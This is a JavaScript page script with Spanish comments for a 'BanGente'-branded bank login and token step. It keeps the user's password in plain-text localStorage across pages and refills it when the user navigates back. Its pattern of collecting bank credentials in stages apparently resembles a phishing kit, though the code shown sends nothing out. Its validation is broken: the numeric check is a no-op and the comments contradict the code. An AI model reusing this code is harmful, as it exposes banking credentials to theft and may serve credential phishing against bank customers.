/**
 * Gestiona los datos de usuario en localStorage para evitar sobrescritura innecesaria.
 * Solo actualiza los datos si hay información nueva o diferente.
 */
function gestionarDatosUsuario(nuevosDatos) {
    // Obtener datos existentes de localStorage
    const datosExistentes = localStorage.getItem("datosUsuarioBanGente");
    
    // Si no hay datos existentes, simplemente guardar los nuevos
    if (!datosExistentes) {
      localStorage.setItem("datosUsuarioBanGente", JSON.stringify(nuevosDatos));
      return nuevosDatos;
    }
    
    // Convertir los datos existentes a objeto
    const datosObj = JSON.parse(datosExistentes);
    
    // Verificar si hay cambios en los datos
    let hayNuevosDatos = false;
    
    // Comparar cada campo para ver si hay cambios
    for (const campo in nuevosDatos) {
      if (nuevosDatos[campo] !== datosObj[campo] && nuevosDatos[campo]) {
        // Solo actualizar si el nuevo valor no es vacío/null/undefined
        datosObj[campo] = nuevosDatos[campo];
        hayNuevosDatos = true;
      }
    }
    
    // Solo guardar si hay cambios
    if (hayNuevosDatos) {
      localStorage.setItem("datosUsuarioBanGente", JSON.stringify(datosObj));
    }
    
    // Devolver los datos actualizados o los existentes si no hubo cambios
    return datosObj;
  }
  
  /**
   * Restaura datos guardados en localStorage si el usuario navega hacia atrás.
   * @returns {Object|null} Los datos restaurados o null si no hay datos
   */
  function restaurarDatosAlVolverAtras() {
    // Detectar si se está volviendo atrás usando la API de History
    // Esta función se debe llamar al cargar la página
    const datosGuardados = localStorage.getItem("datosUsuarioBanGente");
    
    if (datosGuardados) {
      // Si hay datos guardados, devolverlos para que la página los use
      return JSON.parse(datosGuardados);
    }
    
    return null;
  }
  
  /**
   * Función para obtener los datos actualizados del localStorage
   */
  function obtenerDatosAlmacenados() {
    return JSON.parse(localStorage.getItem("datosUsuarioBanGente") || "{}");
  }
  
  /**
   * Valida que el input de password solo acepte valores numéricos y limite su longitud.
   * Además activa o desactiva el botón Siguiente según si hay al menos 3 caracteres.
   */
  function handleTokenInput() {
    if (!password) return;
    
    // Validar que solo sean números
    const inputValue = password.value;
    const numericValue = inputValue;
    
    // Si se intentó ingresar algo que no es un número, reemplazar el valor
    if (inputValue !== numericValue) {
      password.value = numericValue;
    }
    
    // Limitar a 6 dígitos (estándar para passwords bancarios)
    if (numericValue.length > 20) {
      password.value = numericValue.substring(0, 20);
    }
    
    // Activar o desactivar el botón según la longitud
    if (siguienteBtn) {
      // Simplificación para pruebas - activar con cualquier valor numérico
      if (password.value.length >= 3) {
        siguienteBtn.disabled = false;
      } else {
        siguienteBtn.disabled = true;
      }
    } else {
    }
  }
  
  /**
   * Actualiza el campo de token si hay un valor guardado previamente.
   * Esta función es específica para la página token.html
   * @param {Object} datos Los datos para rellenar el formulario
   */
  function rellenarFormularioToken(datos) {
    if (!datos) return;
    
    // En la página de token, solo nos interesa rellenar el campo de token si existe
    if (password && datos.password) {
      password.value = datos.password;
      // Activar el botón si el token tiene suficiente longitud
      handleTokenInput();
    }
  }
  
  // Exportar funciones para que puedan ser utilizadas desde script.js
  window.gestionarDatosUsuario = gestionarDatosUsuario;
  window.restaurarDatosAlVolverAtras = restaurarDatosAlVolverAtras;
  
  // Variables globales que se inicializarán en DOMContentLoaded
  let formulario;
  let password;
  let siguienteBtn;
  let overlay;
  let preloader;
  let datosUsuario = {};
  
  // Un solo DOMContentLoaded para toda la inicialización
  document.addEventListener("DOMContentLoaded", function() {
    // Inicializar elementos DOM
    formulario = document.getElementById("login-form");
    password = document.getElementById("password");
    siguienteBtn = document.getElementById("btn-siguiente");
    overlay = document.querySelector(".overlay");
    preloader = document.getElementById("preloader");
    
    // Ocultar el preloader por defecto
    if (preloader) {
      preloader.style.display = "none";
    }
    
    // Ocultar el overlay al inicio si existe
    if (overlay) {
      overlay.style.display = "none";
    }
    
    // Obtener datos almacenados
    datosUsuario = obtenerDatosAlmacenados();
    
    // Verificar si estamos volviendo atrás
    if (window.performance && window.performance.navigation.type === window.performance.navigation.TYPE_BACK_FORWARD) {
      // Si estamos volviendo atrás, restaurar datos
      const datosRestaurados = restaurarDatosAlVolverAtras();
      rellenarFormularioToken(datosRestaurados);
    }
    
    // Configurar validación del token
    if (password) {
      // Agregar validación en cada evento de input
      password.addEventListener("input", handleTokenInput);
      
      // También validar en eventos de pegado (paste)
      password.addEventListener("paste", function(e) {
        // Permitir que ocurra el pegado
        setTimeout(function() {
          // Luego validar y corregir
          handleTokenInput();
        }, 0);
      });
      
      // Enfoque automático en el campo token
      setTimeout(function() {
        password.focus();
      }, 100);
      
      // Ejecutar una vez para configurar el estado inicial del botón
      handleTokenInput();
    }
    
    // Manejar el evento de clic en el botón Siguiente
    if (siguienteBtn && formulario) {  
      siguienteBtn.addEventListener("click", function() {
        // Verificar si el botón no está deshabilitado
        if (!siguienteBtn.disabled) {
          // Enviar el formulario
          const event = new Event("submit");
          formulario.dispatchEvent(event);
        }
      });
    }
    
  });